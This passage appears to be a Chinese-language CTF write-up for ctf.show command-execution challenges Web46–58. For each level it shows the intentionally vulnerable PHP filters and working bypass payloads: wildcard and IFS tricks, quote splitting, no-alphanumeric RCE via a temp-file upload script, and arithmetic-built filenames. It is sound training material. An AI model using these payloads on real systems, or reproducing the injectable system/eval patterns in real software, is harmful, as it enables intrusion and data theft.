class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了$ * 和数字</p><p>使用?绕过对*的过滤</p><blockquote><p><code>&quot;?&quot;和&quot;*&quot;的区别：</code></p><p><code>?只能通配某个字符，如flag.php -&gt; fla?.php fl??.ph?</code></p><p><code>*可以通配整个字符串，如flag.php -&gt; f*</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl%09fl?g.php||<br></code></pre></td></tr></table></figure><p>这里%09还能用是因为参数验证前进行了url解码 %09 变成了tab字符</p><p>查看源代码获取flag</p><h2 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多了more less head sort tail</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>nl<span class="hljs-variable">%09</span>fl?g.php||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多了sed cut awk strings od curl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl%09fl?g.php||<br></code></pre></td></tr></table></figure><h2 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>多了&#96; 和 %</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl%09fl?g.php||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多了x09 x26</p><p>%09不能用了换成&lt; </p><p>nl不支持通配符使用引号分割</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl&lt;fl&#x27;&#x27;ag.php||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多了tac</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl&lt;fl&#x27;&#x27;ag.php||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多了 &lt; &gt;</p><p>这里把&lt; 换成 <code>$IFS</code></p><p>这里有个坑 flag.php是空的真正的flag在根目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl$&#123;IFS&#125;/fl&#x27;&#x27;ag||<br></code></pre></td></tr></table></figure><h2 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;</span><br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        echo($c);<br>        $d = system($c);<br>        echo &quot;&lt;br&gt;&quot;.$d;<br>    &#125;else&#123;<br>        echo &#x27;no&#x27;;<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125; <br></code></pre></td></tr></table></figure><p>直接执行不需要||</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl$&#123;IFS&#125;fl&#x27;&#x27;ag.php<br></code></pre></td></tr></table></figure><h2 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>彻底过滤了通配符* 用 多个?代替</p><p>nl也被过滤了</p><p>可以使用uniq代替nl</p><blockquote><p>uniq在linux中用来去重 同时也会将去重后的文件内容显示出来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=uniq$&#123;IFS&#125;f???????<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><p>其他姿势</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">可以使用<span class="hljs-built_in">mv</span>将flag.php文件移动到其他文件 然后访问文件拿到flag</span><br>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用执行文件目录+?来绕过被过滤的命令</span><br>?c=/bin/?at$&#123;IFS&#125;f???????<br></code></pre></td></tr></table></figure><h2 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br>// 你们在炫技吗？<br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;</span><br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了 字母、分号、反引号、”%09”、”%26”和 &lt;&gt;</p><h3 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h3><p>同样是利用bin目录</p><blockquote><p>bin为binary的简写，主要放置系统的必备执行文件，例如:<br>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。 </p></blockquote><p>使用base64对flag.php进行加密 同时使用?绕过字母的限制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=/???/????64%20????.???  # /bin/base64 flag.php<br></code></pre></td></tr></table></figure><p>base64解密拿到flag</p><h3 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h3><p>利用&#x2F;usr&#x2F;bin目录</p><blockquote><p>&#x2F;usr&#x2F;sbin 放置一些用户安装的系统管理的必备程式。</p><p>例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。</p></blockquote><p>利用bzip2命令把flag.php给压缩然后访问flag.php.bz2下载压缩包 然后解压拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=/???/???/????2 ????????  # /usr/bin/bzip2 flag.php<br></code></pre></td></tr></table></figure><h2 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>字母和数字都被过滤了</p><p>这里利用无字母RCE </p><p>参考P牛的文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p>先构造一个post文件上传包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://ac1db69c-3219-4621-b76e-040d6e281317.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>提交1.php抓包</p><p><img src="/posts/999021e8/image-20220329151337441.png" alt="ctfshow命令执行56"></p><p>使用重发器发包拿到flag</p><p>还有师傅写了python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://ac1db69c-3219-4621-b76e-040d6e281317.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;feng.txt&#x27;</span>, <span class="hljs-string">b&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;flag&quot;</span>) &gt;<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这里利用 $(( ))与整数运算。想办法构造出36.</p><blockquote><p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p><p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p><p>可以使用<code>$</code>获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p><p>可以在 (( )) 前面加上<code>$</code>符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p><p>注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p></blockquote><p><img src="/posts/999021e8/image-20220329163510711.png" alt="image-20220329163510711"></p><p><img src="/posts/999021e8/image-20220329163742001.png" alt="image-20220329163742001"></p><p><code>$(())</code>是0</p><p><code>$((~$(())))</code>是-1</p><p><code>$(($((~$(())))$((~$(())))))</code>是-2</p><p>这里需要构造36</p><p>也就是要先构造出-37 然后取反</p><p>-37是37个<code>$((~$(())))</code>相加</p><p>最终payload</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><h2 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这道题因为disable_functions禁用了system exec popen passthru </p><p>使用读文件函数拿flag</p><blockquote><p>file_get_contents()<br>highlight_file()<br>show_source()<br>fgets()<br>file()<br>readfile()</p></blockquote><p>没有过滤直接用</p><p>注意post提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#payload1</span><br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-comment">#payload2</span><br>c=<span class="hljs-title function_ invoke__">show_source</span>(<span 